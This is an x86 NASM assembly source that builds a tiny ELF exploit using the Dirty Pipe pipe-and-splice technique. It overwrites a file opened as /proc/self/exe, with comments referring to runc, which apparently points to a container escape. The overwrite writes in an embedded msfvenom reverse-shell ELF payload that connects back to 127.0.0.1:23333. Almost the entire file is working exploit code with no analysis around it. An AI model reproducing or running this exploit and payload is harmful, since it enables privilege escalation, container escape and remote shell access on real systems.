; nasm -f bin dirty.asm -o dirty
	BITS 32
	
	org 0x08048000
	
ehdr:                         ; Elf32_Ehdr
	db 0x7F, "ELF", 1, 1, 1      ; e_ident
	times 9 db 0
	dw 2                         ; e_type
	dw 3                         ; e_machine
	dd 1                         ; e_version
	dd _start                    ; e_entry
	dd phdr - $$                 ; e_phoff
	dd 0                         ; e_shoff
	dd 0                         ; e_flags
	dw ehdrsize                  ; e_ehsize
	dw phdrsize                  ; e_phentsize
	dw 1                         ; e_phnum
	dw 0                         ; e_shentsize
	dw 0                         ; e_shnum
	dw 0                         ; e_shstrndx
	
	ehdrsize equ $ - ehdr
	
phdr:                         ; Elf32_Phdr
	dd 1                         ; p_type
	dd 0                         ; p_offset
	dd $$                        ; p_vaddr
	dd $$                        ; p_paddr
	dd filesize                  ; p_filesz
	dd filesize                  ; p_memsz
	dd 5                         ; p_flags
	dd 0x1000                    ; p_align
	
	phdrsize equ $ - phdr
	
_start:
	
	global _start
	
	section .text
	
_start:
	call main
	
main:
	sub esp, 0x10008
	
; * * * * * * * * * * * * * * * * * * * 
; prepare_pipe
; pipe(p);
; * * * * * * * * * * * * * * * * * * * 
prepare_pipe:
	mov eax, SYS_PIPE
	mov ebx, esp                 ; p
	int 0x80
	
; * * * * * * * * * * * * * * * * * * * 
; write
; init pipe with 65536
; write(p[1], buffer, PAGE_SIZE);
; * * * * * * * * * * * * * * * * * * * 
write:
	mov eax, SYS_WRITE
	mov edx, PAGE_SIZE
	lea ecx, [esp + 8]           ;buffer
	mov ebx, [esp + 4]           ; p[1]
	int 0x80
	
; * * * * * * * * * * * * * * * * * * * 
; read
; init pipe with 65536
; read(p[0], buffer, PAGE_SIZE);
; * * * * * * * * * * * * * * * * * * * 
read:
	mov eax, SYS_READ
	mov edx, PAGE_SIZE
	lea ecx, [esp + 8]           ;buffer
	mov ebx, [esp]               ; p[0]
	int 0x80
	
; * * * * * * * * * * * * * * * * * * * 
; open
; get runc's fd
; open(filename, 0);
; * * * * * * * * * * * * * * * * * * * 
open:
	mov eax, SYS_OPEN
	mov edx, 0
	mov ecx, O_RDONLY            ;flags
	mov ebx, runc                ;filename
	;lea ebx, [rel runc]
	int 0x80
	
; * * * * * * * * * * * * * * * * * * * 
; splice
; splice(fd, 0, p[1], NULL, 1, 0);
; * * * * * * * * * * * * * * * * * * * 
splice:
	mov ebp, 0                   ; flags
	mov edi, 1                   ; len
	mov esi, NULL                ; off_out
	mov edx, [esp + 4]           ; p[1]
	mov ecx, 0                   ; offset
	mov ebx, eax                 ; fd
	mov eax, SYS_SPLICE
	int 0x80
	
; * * * * * * * * * * * * * * * * * * * 
; write_payload
; write(p[1], payload, length);
; * * * * * * * * * * * * * * * * * * * 
write_payload:
	mov edx, MAX_LENGTH          ; length
	mov ecx, payload             ; payload
	;lea ecx, [rel payload]
	mov ebx, [esp + 4]           ; p[1]
	mov eax, SYS_WRITE
	int 0x80
	
; * * * * * * * * * * * * * * * * * * * 
; exit
; * * * * * * * * * * * * * * * * * * * 
exit:
	mov eax, SYS_EXIT
	xor edi, edi                 ; exit code 0
	int 0x80                     ; invoke operating system to exit
	
; * * * * * * * * syscall * * * * * * * 
SYS_READ: equ 3
SYS_WRITE: equ 4
SYS_OPEN: equ 5
SYS_PIPE: equ 0x2a
SYS_EXIT: equ 1
SYS_SPLICE: equ 0x139

; * * * * * * * * flag * * * * * * * 
LF equ 10                    ; line feed
NULL equ 0                   ; end of string
STDOUT: equ 1
O_RDONLY equ 000000q         ; read only
BUFF_SIZE equ 255
PAGE_SIZE equ 65536
MAX_LENGTH equ 151

; * * * * * * * * string * * * * * * * 
runc db '/proc/self/exe', NULL ; runc fd
; runc db '/tmp/fd', NULL  ; runc fd
; payload db 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa'
; msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=23333 -f elf > reverse.elf
payload: db 69, 76, 70, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 3, 0, 1, 0, 0, 0, 84, 128, 4, 8, 52, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 52, 0, 32, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 128, 4, 8, 0, 128, 4, 8, 152, 0, 0, 0, 220, 0, 0, 0, 7, 0, 0, 0, 0, 16, 0, 0, 49, 219, 247, 227, 83, 67, 83, 106, 2, 137, 225, 176, 102, 205, 128, 147, 89, 176, 63, 205, 128, 73, 121, 249, 104, 127, 0, 0, 1, 104, 2, 0, 91, 37, 137, 225, 176, 102, 80, 81, 83, 179, 3, 137, 225, 205, 128, 82, 104, 110, 47, 115, 104, 104, 47, 47, 98, 105, 137, 227, 82, 83, 137, 225, 176, 11, 205, 128

filesize equ $ - $$
